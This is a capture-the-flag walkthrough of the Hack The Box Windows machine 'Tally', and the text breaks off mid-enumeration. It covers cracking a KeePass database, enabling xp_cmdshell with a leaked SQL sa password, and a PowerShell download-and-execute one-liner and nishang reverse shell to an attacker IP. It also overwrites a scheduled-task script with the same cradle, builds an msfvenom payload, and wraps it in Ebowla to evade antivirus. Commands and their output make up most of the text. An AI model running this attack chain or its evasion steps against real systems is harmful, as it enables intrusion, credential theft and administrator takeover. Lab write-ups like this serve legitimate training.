@@ -1,0 +1,988 @@
+Tally - Hack The Box - Windows Hard
+
+We come to find the machine is a sharepoint server.
+
+We run a gobuster against the site.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tally]
+└──╼ $gobuster dir -u http://10.10.10.59/ -w /opt/SecLists/Discovery/Web-Content/CMS/sharepoint.txt -o gobuster.log
+==================================================================================================================================
+
+One fo the sites we probe is:
+10.10.10.59/_layouts/viewlsts.aspx
+
+Based on the output by visiting the site in question, we get two items 
+Documents and Site Pages
+
+We open links on both of those
+http://10.10.10.59/Shared%20Documents/Forms/AllItems.aspx
+http://10.10.10.59/_layouts/15/start.aspx#/SitePages/Forms/AllPages.aspx
+
+We get a file for Documents named ftp but non from the site pages webpage.
+
+We open the docx file with xdg-open and get the following 
+Commands and Output:
+==================================================================================================================================
+FTP details
+hostname: tally
+workgroup: htb.local
+password: UTDRSCH53c"$6hys
+Please create your own user folder upon logging in
+==================================================================================================================================
+
+
+We update our hosts file with workgroup and hostname just in case. We don't have another username.
+Also make sure to add tally to the hosts file using the corresponding IP address as this reveals more file info, than if only using
+the IP itself.
+http://tally/_layouts/15/start.aspx#/SitePages/FinanceTeam.aspx
+Commands and Output:
+==================================================================================================================================
+Migration update
+Hi all,
+
+Welcome to your new team page!
+
+As always, there's still a few finishing touches to make.  Rahul - please upload the design mock ups to the Intranet folder as 'index.html' using the ftp_user account - I aim to review regularly.
+
+We'll also add the fund and client account pages in due course.
+
+Thanks – Sarah & Tim.
+==================================================================================================================================
+
+So from here we get a couple of usernames we can use in conjunction with password we got from the sharepoint file.
+Most likely ftp_user, and Rahul, Sarah, Tim.
+
+We use the ftp_user we got from the sharepoint file and we login
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tally/sharepoint]
+└──╼ $ftp tally
+Connected to tally.
+220 Microsoft FTP Service
+Name (tally:user): ftp_user
+331 Password required
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+08-31-17  11:51PM       <DIR>          From-Custodian
+10-01-17  11:37PM       <DIR>          Intranet
+08-28-17  06:56PM       <DIR>          Logs
+09-15-17  09:30PM       <DIR>          To-Upload
+09-17-17  09:27PM       <DIR>          User
+226 Transfer complete.
+
+==================================================================================================================================
+
+
+There is quite a number of files so we can use wget to recursively grab them as follows.
+Commands and Output:
+==================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/tally/sharepoint]
+└──╼ $wget --mirror 'ftp://ftp_user:UTDRSCH53c"$6hys@tally.htb.local' 
+..
+..
+..
+<SNIP>
+..
+..
+Total wall clock time: 3m 36s
+Downloaded: 158 files, 98M in 2m 10s (773 KB/s)
+==================================================================================================================================
+
+We find a kind of good amount of directories downloaded and interestingly find an installer in the intranet folder for the firefox
+application.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tally/sharepoint/tally.htb.local/Intranet/Binaries]
+└──╼ $ls
+'Firefox Setup 44.0.2.exe'
+==================================================================================================================================
+
+So we take note of that and continue looking for more interesting things. The interesting portion comes from the user directory
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tally/sharepoint/tally.htb.local/User]
+└──╼ $find . -type f
+./.listing
+./Administrator/.listing
+./Administrator/New folder/.listing
+./Ekta/.listing
+./Ekta/OFSI_quick_guide_flyer.pdf
+./Ekta/PSAIS_1_April_2017.pdf
+./Jess/.listing
+./Jess/actu8-espreadsheet-designer-datasheet.pdf
+./Paul/.listing
+./Paul/financial-list-guide.pdf
+./Paul/financial_sanctions_guidance_august_2017.pdf
+./Paul/Monetary_penalties_for_breaches_of_financial_sanctions.pdf
+./Paul/New folder/.listing
+./Rahul/.listing
+./Rahul/Mockups-Backup/.listing
+./Sarah/.listing
+./Sarah/MBSASetup-x64-EN.msi
+./Sarah/notes.txt
+./Sarah/Windows-KB890830-x64-V5.52.exe
+./Stuart/.listing
+./Stuart/customers - Copy.csv
+./Stuart/Unit4-Connect-Financials-Agenda.pdf
+./Tim/.listing
+./Tim/Files/.listing
+./Tim/Files/bonus.txt
+./Tim/Files/tim.kdbx
+./Tim/Files/KeePass-2.36/.listing
+./Tim/Files/KeePass-2.36/KeePass.chm
+./Tim/Files/KeePass-2.36/KeePass.exe
+./Tim/Files/KeePass-2.36/KeePass.exe.config
+./Tim/Files/KeePass-2.36/KeePass.XmlSerializers.dll
+./Tim/Files/KeePass-2.36/KeePassLibC32.dll
+./Tim/Files/KeePass-2.36/KeePassLibC64.dll
+./Tim/Files/KeePass-2.36/License.txt
+./Tim/Files/KeePass-2.36/ShInstUtil.exe
+./Tim/Files/KeePass-2.36/Plugins/.listing
+./Tim/Files/KeePass-2.36/XSL/.listing
+./Tim/Files/KeePass-2.36/XSL/KDBX_Common.xsl
+./Tim/Files/KeePass-2.36/XSL/KDBX_DetailsFull_HTML.xsl
+./Tim/Files/KeePass-2.36/XSL/KDBX_DetailsLight_HTML.xsl
+./Tim/Files/KeePass-2.36/XSL/KDBX_PasswordsOnly_TXT.xsl
+./Tim/Files/KeePass-2.36/XSL/KDBX_Tabular_HTML.xsl
+./Tim/Project/.listing
+./Tim/Project/Communications/.listing
+./Tim/Project/Log/.listing
+./Tim/Project/Log/do to.txt
+./Tim/Project/Vendors/.listing
+./Yenwi/.listing
+./Yenwi/Archive/.listing
+==================================================================================================================================
+
+The most eye catching files come from Tim's directory which point to a bunch of keePass files.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tally/sharepoint/tally.htb.local/User/Tim/Files]
+└──╼ $file tim.kdbx 
+tim.kdbx: Keepass password database 2.x KDBX
+==================================================================================================================================
+
+We indeed get a keepass database so we can do keepass2john to get a has formated file and do a dictionary attack to find the 
+passphrase for the db.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tally/sharepoint/tally.htb.local/User/Tim/Files]
+└──╼ $keepass2john tim.kdbx 
+tim:$keepass$*2*6000*0*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tally/sharepoint/keepass]
+└──╼ $hashcat -m 13400 hash.txt /usr/share/wordlists/rockyou.txt --force
+==================================================================================================================================
+
+We do the cracking and find the password relatively fast
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tally/sharepoint/keepass]
+└──╼ $hashcat -m 13400 hash.txt /usr/share/wordlists/rockyou.txt --force --show
+$keepass$*2*6000*0*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da:simplementeyo
+==================================================================================================================================
+
+We can now install keepassx
+Commands and Output:
+==================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/tally]
+└──╼ $sudo apt install keepassx
+==================================================================================================================================
+
+We can now open the keepassx application and enter the password simplementeyo
+AND we are in. We find an interesting password in Shares>TALLY ACCT share > Edit Entry
+Commands and Output:
+==================================================================================================================================
+Username: Finance
+Pasword: Acc0unting
+..
+..
+..
+
+Username: cisco
+Password: cisco123
+==================================================================================================================================
+
+We can now try mounting the Shares directry using the Finance account and password using mount command
+Commands and Output:
+==================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/tally]
+└──╼ $sudo mount -t cifs  -o 'username=Finance,password=Acc0unting' //10.10.10.59/ACCT /mnt
+┌─[✗]─[user@parrot-virtual]─[~/htb/tally]
+└──╼ $cd /mnt/
+┌─[user@parrot-virtual]─[/mnt]
+└──╼ $ls
+Customers  Fees  Invoices  Jess  Payroll  Reports  Tax  Transactions  zz_Archived  zz_Migration
+==================================================================================================================================
+
+We get more folders/files, we can copy all the file into a local folder to better examine with out lags.
+we can look through all the files but after enumeration we come to look at the zz_migration folder and inside we take note of the 
+'New folder' directory
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tally/smb/zz_Migration]
+└──╼ $cd Binaries/
+┌─[user@parrot-virtual]─[~/htb/tally/smb/zz_Migration/Binaries]
+└──╼ $ls
+ CardReader   FileZilla_Server-0_9_60_2.exe   NDP452-KB2901907-x86-x64-AllOS-ENU.exe  'New folder'   Sage50_2017.2.0.exe
+==================================================================================================================================
+
+We further inspect and find an interesting binary that maybe custom which is the tester.exe file we can from there do a quick 
+analysis by running strings against the file.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tally/smb/zz_Migration/Binaries/New folder]
+└──╼ $ls
+crystal_reports_viewer_2016_sp04_51051980.zip  Orchard.Web.1.7.3.zip  RpprtSetup.exe                    tester.exe
+Macabacus2016.exe                              putty.exe              tableau-desktop-32bit-10-3-2.exe  vcredist_x64.exe
+┌─[user@parrot-virtual]─[~/htb/tally/smb/zz_Migration/Binaries/New folder]
+└──╼ $strings tester.exe 
+..
+..
+..
+<SNIP>
+..
+..
+WVU3
+v	N+D$
+WVS3
+<$Xf
+^_[3
+SQLSTATE: 
+Message: 
+DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;
+select * from Orchard_Users_UserPartRecord
+Unknown exception
+bad cast
+bad locale name
+false
+true
+generic
+..
+..
+..
+
+==================================================================================================================================
+
+Eventually we find a string that contains a username uid "sa" and a pasword for the database orcharddb "GWE3V65#6KFH93@4GWTG2G"
+We can now use these with sqsh to connect to the sql server.
+
+If this were not a sa account, just a user account we could try something like powerup sql but would need windows and connect via vpn
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tally]
+└──╼ $sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G
+sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
+Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
+This is free software with ABSOLUTELY NO WARRANTY
+For more information type '\warranty'
+1> xp_cmdshell 'whoami'
+2> go
+Msg 15281, Level 16, State 1
+Server 'TALLY', Procedure 'xp_cmdshell', Line 1
+SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the
+security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more
+information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
+==================================================================================================================================
+
+First thing we do once we connect with sa account is run the "xp_cmdshell" with go to see if we can run commands however it appears 
+to be not the case. So we instead have to turn the feature on.
+Commands and Output:
+==================================================================================================================================
+1>  EXEC SP_CONFIGURE 'xp_cmdshell ', 1
+2> go
+Msg 15123, Level 16, State 1
+Server 'TALLY', Procedure 'sp_configure', Line 62
+The configuration option 'xp_cmdshell ' does not exist, or it may be an advanced option.
+(return status = 1)
+==================================================================================================================================
+
+However the configuration option does not exist. So we will have to enable them with advanced options. Follwoing the next steps.
+Commands and Output:
+==================================================================================================================================
+1> EXEC SP_CONFIGURE 'show advanced options', 1
+2> go
+Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+(return status = 0)
+1> reconfigure
+2> go
+1> EXEC SP_CONFIGURE 'xp_cmdshell', 1
+2> go
+Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+(return status = 0)
+1> reconfigure
+2> go
+1> xp_cmdshell 'whoami'
+2> go
+==================================================================================================================================
+
+After running the go output, we should get the whoami, output as well
+Commands and Output:
+==================================================================================================================================
+2> go
+
+	output                                                                                                                            
+----------------------------------------------------------------------------------------------------------
+
+	tally\sarah                                                                                                                       
+
+	NULL                                                                                                                              
+==================================================================================================================================
+
+We can now execute commands so the next steps is to get a reverse shell on the box. But before that we want to check if the SE
+impersonate token is set so we can maybe exploit it later. This can be done with the following.
+Commands and Output:
+==================================================================================================================================
+1>  xp_cmdshell 'whoami /priv'
+2> go
+
+	output                                                                                                                            
+
+	PRIVILEGES INFORMATION                                                                                                            
+
+	Privilege Name                Description                               State                                                     
+
+	SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled                                                  
+
+	SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled                                                  
+
+	SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled                                                   
+
+	SeImpersonatePrivilege        Impersonate a client after authentication Enabled                                                   
+
+	SeCreateGlobalPrivilege       Create global objects                     Enabled                                                   
+                                                                                                          
+
+	SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled                                                  
+==================================================================================================================================
+
+It appears to be vulnerable. We now go to getting a shell on the box and will use nishangs repo to get a tcp one liner connection
+
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[/opt/nishang/Shells]
+└──╼ $cp Invoke-PowerShellTcp.ps1 ~/htb/tally/
+
+..
+..
+..
+## WE add the following line to the end of file to be executed
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.18 -Port 9001
+==================================================================================================================================
+
+All we need to do is set up simple http server on our end and have powershell execute the script while we listen on port 9001 for the
+callback with netcat.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tally]
+└──╼ $mv Invoke-PowerShellTcp.ps1 rev.ps1
+┌─[user@parrot-virtual]─[~/htb/tally]
+└──╼ $mkdir www
+┌─[user@parrot-virtual]─[~/htb/tally]
+└──╼ $mv rev.ps1 www/
+┌─[user@parrot-virtual]─[~/htb/tally]
+└──╼ $ls
+gobuster.log  ls  nmap  notes.txt  sharepoint  smb  www
+┌─[user@parrot-virtual]─[~/htb/tally]
+└──╼ $cd www/
+┌─[user@parrot-virtual]─[~/htb/tally/www]
+└──╼ $ls
+rev.ps1
+┌─[user@parrot-virtual]─[~/htb/tally/www]
+└──╼ $sudo python3 -m http.server 80
+[sudo] password for user: 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.59 - - [21/May/2021 21:38:42] "GET /rev.ps1 HTTP/1.1" 200 -
+..
+..
+..
+
+
+1> xp_cmdshell "powershell IEX(New-Object Net.webClient).DownloadString('http://10.10.14.18/rev.ps1')"
+2> go
+
+..
+..
+..
+
+┌─[✗]─[user@parrot-virtual]─[~/htb/tally]
+└──╼ $rlwrap nc -lnvp 9001
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::9001
+Ncat: Listening on 0.0.0.0:9001
+Ncat: Connection from 10.10.10.59.
+Ncat: Connection from 10.10.10.59:50575.
+Windows PowerShell running as user Sarah on TALLY
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32>
+
+==================================================================================================================================
+
+We now have a shell on the box, there are a few ways to privesc. We go to sarah's directory and find numerous files 
+Commands and Output:
+==================================================================================================================================
+PS C:\users\sarah\Desktop> dir
+
+
+    Directory: C:\users\sarah\Desktop
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-ar---       01/10/2017     22:32            916 browser.bat                                                           
+-a----       17/09/2017     21:50            845 FTP.lnk                                                               
+-a----       23/09/2017     21:11            297 note to tim (draft).txt                                               
+-a----       19/10/2017     21:49          17152 SPBestWarmUp.ps1                                                      
+-a----       19/10/2017     22:48          11010 SPBestWarmUp.xml                                                      
+-a----       17/09/2017     21:48           1914 SQLCMD.lnk                                                            
+-a----       21/09/2017     00:46            129 todo.txt                                                              
+-ar---       31/08/2017     02:04             32 user.txt                                                              
+-a----       17/09/2017     21:49            936 zz_Migration.lnk
+==================================================================================================================================
+
+One in particluar is the browser.bat file, but nothng too interesting. We read the note and it states the following.
+Commands and Output:
+==================================================================================================================================
+PS C:\users\sarah\Desktop> get-content "note to tim (draft).txt"
+Hi Tim,
+
+As discussed in the cybersec meeting, malware is often hidden in trusted executables in order to evade detection. I read somewhere that cmd.exe is a common target for backdooring, so I've gone ahead and disallowed any cmd.exe outside the Windows folder from executing.
+
+Thanks,
+Sarah
+==================================================================================================================================
+
+Cmd is prevented from running outside the windows folder, only works in c:\windows. We check other files and one that rbings an 
+interesting task is the SPBestWarmUp.xml which runs apparently every hour
+Commands and Output:
+==================================================================================================================================
+PS C:\users\sarah\Desktop> get-content SPBestWarmUp.xml
+<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <Triggers>
+    <CalendarTrigger>
+      <Repetition>
+        <Interval>PT1H</Interval>
+        <Duration>P1D</Duration>
+        <StopAtDurationEnd>false</StopAtDurationEnd>
+      </Repetition>
+      <StartBoundary>2017-01-25T01:00:00</StartBoundary>
+      <Enabled>true</Enabled>
+      <ScheduleByDay>
+        <DaysInterval>1</DaysInterval>
+      </ScheduleByDay>
+    </CalendarTrigger>
+..
+..
+<snip>
+..
+..
+    <Principal id="Author">
+      <UserId>TALLY\Administrator</UserId>
+      <LogonType>Password</LogonType>
+      <RunLevel>HighestAvailable</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
+    <AllowHardTerminate>true</AllowHardTerminate>
+    <StartWhenAvailable>false</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <IdleSettings>
+      <StopOnIdleEnd>true</StopOnIdleEnd>
+      <RestartOnIdle>false</RestartOnIdle>
+    </IdleSettings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>false</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
+    <Priority>7</Priority>
+  </Settings>
+  <Actions Context="Author">
+    <Exec>
+      <Command>PowerShell.exe</Command>
+      <Arguments>-ExecutionPolicy Bypass -File SPBestWarmUp.ps1 -skipadmincheck</Arguments>
+      <WorkingDirectory>C:\Users\Sarah\Desktop</WorkingDirectory>
+==================================================================================================================================
+
+Looks like it is being run by the administator as a scheduled task. The ps1 file can be written to so we can create a rev shell 
+and wait for execution to perhaps become the administrator user.
+
+So we can just echo powershell command to downlad and execute the nishang reverse shell payload.
+Commands and Output:
+==================================================================================================================================
+PS C:\users\sarah\Desktop> echo "IEX(New-Object Net.webClient).DownloadString('http://10.10.14.18/rev-9002.ps1')" > SPBestWarmUp.ps1
+PS C:\users\sarah\Desktop> get-content SPBestWarmUp.ps1
+IEX(New-Object Net.webClient).DownloadString('http://10.10.14.18/rev-9002.ps1')
+..
+..
+..
+┌─[user@parrot-virtual]─[~/htb/tally]
+└──╼ $nc -lnvp 9002
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::9002
+Ncat: Listening on 0.0.0.0:9002
+
+==================================================================================================================================
+
+We can wait to see if we get a reverse shell, in the mean time look for other ways to get admin.
+We can now get a privilege escalation tool such powerup to see if there are any things that could be exploited.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tally/www]
+└──╼ $wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
+..
+..
+..
+PS C:\users\sarah\Desktop> IEX(New-Object Net.webClient).DownloadString('http://10.10.14.18/PowerUp.ps1')
+PS C:\users\sarah\Desktop> invoke-allchecks
+==================================================================================================================================
+
+And we wait for output to comeback. We get the following
+Commands and Output:
+==================================================================================================================================
+PS C:\users\sarah\Desktop> invoke-allchecks
+
+
+Privilege   : SeImpersonatePrivilege
+Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+TokenHandle : 2468
+ProcessId   : 8052
+Name        : 8052
+Check       : Process Token Privileges
+
+ServiceName    : c2wts
+Path           : C:\Program Files\Windows Identity Foundation\v3.5\c2wtshost.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'c2wts' -Path <HijackPath>
+CanRestart     : False
+Name           : c2wts
+Check          : Unquoted Service Paths
+
+ServiceName    : c2wts
+Path           : C:\Program Files\Windows Identity Foundation\v3.5\c2wtshost.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'c2wts' -Path <HijackPath>
+CanRestart     : False
+Name           : c2wts
+Check          : Unquoted Service Paths
+
+ModifiablePath    : C:\Users\Sarah\AppData\Local\Microsoft\WindowsApps
+IdentityReference : TALLY\Sarah
+Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
+%PATH%            : C:\Users\Sarah\AppData\Local\Microsoft\WindowsApps
+Name              : C:\Users\Sarah\AppData\Local\Microsoft\WindowsApps
+Check             : %PATH% .dll Hijacks
+AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\Sarah\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'
+
+DefaultDomainName    : 
+DefaultUserName      : sarah
+DefaultPassword      : mylongandstrongp4ssword!
+AltDefaultDomainName : 
+AltDefaultUserName   : 
+AltDefaultPassword   : 
+Check                : Registry Autologons
+
+UnattendPath : C:\Windows\Panther\Unattend.xml
+Name         : C:\Windows\Panther\Unattend.xml
+Check        : Unattended Install Files
+==================================================================================================================================
+
+We have potential dll hijacking, unquoted service paths which will require a reboot. SEImpersonate token is enabled.
+Jeeves; Foxglove security SE Impersonate.
+https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
+https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/
+
+We will use rotten potatoe, decoders version of rotten potatoe since we don't want to use metasploit. 
+We can also use rotten potatoeng
+
+The website for decoder is https://decoder.cloud
+https://decoder.cloud/2018/01/13/potato-and-tokens/
+
+We can grab a clone of decoders work from the following github
+https://github.com/christiancoleman/lonelypotato.git
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tally/lonelypotato/RottenPotatoEXE/x64/Release]
+└──╼ $file MSFRottenPotato.exe 
+MSFRottenPotato.exe: PE32+ executable (console) x86-64, for MS Windows
+┌─[user@parrot-virtual]─[~/htb/tally/lonelypotato/RottenPotatoEXE/x64/Release]
+└──╼ $cp MSFRottenPotato.exe ../../../../www/lonelypotato.exe
+==================================================================================================================================
+
+One more thing we can use is ebowla to evade anti virus. We can clone this to our /opt directory.
+Ebowla encrypts the payload of your executable with environment variables.
+
+Ebowla ensures that the paylaod executable can only be executed in the target machie keeping things in scope.
+Commands and Output:
+==================================================================================================================================
+sudo git clone https://github.com/Genetic-Malware/Ebowla.git
+==================================================================================================================================
+
+We can modify the variables in the genetic.config file
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[/opt/Ebowla]
+└──╼ $sudo vim genetic.config 
+..
+..
+..
+    [[ENV_VAR]]
+    
+        username = ''
+        computername = 'TALLY'
+        homepath = ''
+        homedrive = ''
+        Number_of_processors = ''
+        processor_identifier = ''
+        processor_revision = ''
+        userdomain = ''
+        systemdrive = ''
+        userprofile = ''
+        path = ''
+        temp = ''
+..
+..
+..
+==================================================================================================================================
+
+Since ebowla can only run using python2 we will need to install some legacy software such as pycryptodome, pyparsing, and configobj
+First we download version of pip for python2
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~]
+└──╼ $wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
+┌─[user@parrot-virtual]─[~]
+└──╼ $sudo python2.7 get-pip.py
+┌─[user@parrot-virtual]─[~]
+└──╼ $which pip2.7
+/usr/local/bin/pip2.7
+┌─[✗]─[user@parrot-virtual]─[/opt/Ebowla]
+└──╼ $pip2.7 install configobj
+┌─[✗]─[user@parrot-virtual]─[/opt/Ebowla]
+└──╼ $pip2.7 install pycryptodome
+┌─[✗]─[user@parrot-virtual]─[/opt/Ebowla]
+└──╼ $pip2.7 install pyparsing
+┌─[user@parrot-virtual]─[/opt/Ebowla]
+└──╼ $python2 ebowla.py 
+Usage: ebowla.py input_file_to_encode config
+==================================================================================================================================
+
+Now we should be able to run ebowla but first we need to make a msfvenom payload for windows.
+Commands and Output:
+==================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/tally/www]
+└──╼ $msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.18 LPORT=9004 -f exe -a x64 -o shell-9004.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: shell-9004.exe
+==================================================================================================================================
+
+We now run ebowla using the newly created staged payload and specify the genetic config file.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tally/www]
+└──╼ $python2.7 /opt/Ebowla/ebowla.py shell-9004.exe /opt/Ebowla/genetic.config 
+[*] Using Symmetric encryption
+[*] Payload length 7168
+[*] Payload_type exe
+[*] Using EXE payload template
+[*] Used environment variables:
+	[-] environment value used: computername, value used: tally
+[!] Path string not used as pasrt of key
+[!] External IP mask NOT used as part of key
+[!] System time mask NOT used as part of key
+[*] String used to source the encryption key: tally
+[*] Applying 10000 sha512 hash iterations before encryption
+[*] Encryption key: 10ec761385e793a40f42f7906556ed3b159453df06bab23256c48f3b90de4834
+[*] Writing GO payload to: go_symmetric_shell-9004.exe.go
+==================================================================================================================================
+
+Now we see an output file containing the go exe file
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tally/www]
+└──╼ $ls
+lonelypotato.exe  output  PowerUp.ps1  rev-9002.ps1  rev.ps1  shell-9004.exe
+┌─[user@parrot-virtual]─[~/htb/tally/www]
+└──╼ $cd output/
+┌─[user@parrot-virtual]─[~/htb/tally/www/output]
+└──╼ $ls
+go_symmetric_shell-9004.exe.go
+==================================================================================================================================
+
+We still need to install more tools unto our system to be able to run the gcc that create windows executables
+Commands and Output:
+==================================================================================================================================
+sudo apt install binutils-mingw-w64
+sudo apt install gcc-mingw-w64-x86-64
+==================================================================================================================================
+
+We can now run the sh script and have it build the custom reverse shell.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[/opt/Ebowla]
+└──╼ $sudo ./build_x64_go.sh output/go_symmetric_shell-9004.exe.go ebowla-shell-9004.exe
+[*] Copy Files to tmp for building
+[*] Building...
+[*] Building complete
+[*] Copy ebowla-shell-9004.exe to output
+[*] Cleaning up
+[*] Done
+┌─[user@parrot-virtual]─[/opt/Ebowla/output]
+└──╼ $cp ebowla-shell-9004.exe ~/htb/tally/www/
+┌─[user@parrot-virtual]─[/opt/Ebowla/output]
+└──╼ $cd !$
+cd ~/htb/tally/www/
+┌─[user@parrot-virtual]─[~/htb/tally/www]
+└──╼ $file ebowla-shell-9004.exe 
+ebowla-shell-9004.exe: PE32+ executable (console) x86-64, for MS Windows
+==================================================================================================================================
+
+After uploading the executable to VirusToTal we see that the ebowla exe was only picked up by 18 vendors of which run dynmaic 
+analysis, while the normal executable by meterpreter with no AV evasion was picked by 50 vendors showcasing the power of the ebowla
+anti-av.
+
+Now we have to figure out a way to upload the files to the server and luckily we have ftp to upload the files. We can use the 
+ftp_user and upload them to the intranet folder.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tally/www]
+└──╼ $ftp 10.10.10.59
+Connected to 10.10.10.59.
+220 Microsoft FTP Service
+Name (10.10.10.59:user): ftp_user
+331 Password required
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> cd Intranet
+250 CWD command successful.
+ftp> bin
+200 Type set to I.
+ftp> put lonelypotato.exe
+local: lonelypotato.exe remote: lonelypotato.exe
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+334336 bytes sent in 0.74 secs (443.6726 kB/s)
+ftp> put ebowla-shell-9004.exe
+local: ebowla-shell-9004.exe remote: ebowla-shell-9004.exe
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+4301882 bytes sent in 2.74 secs (1.4954 MB/s)
+
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+PS C:\users> cd c:\
+PS C:\> dir
+
+
+    Directory: C:\
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----       18/09/2017     06:58                ACCT                                                                  
+d-----       18/09/2017     21:35                FTP                                                                   
+d-----       18/09/2017     22:35                inetpub                                                               
+d-----       16/07/2016     14:23                PerfLogs                                                              
+d-----       24/12/2017     01:46                Program Files                                                         
+d-----       19/10/2017     23:09                Program Files (x86)                                                   
+d-----       01/10/2017     20:46                TEMP                                                                  
+d-r---       12/10/2017     21:28                Users                                                                 
+d-----       23/10/2017     21:44                Windows                                                               
+
+
+PS C:\> cd FTP
+PS C:\FTP> dir
+
+
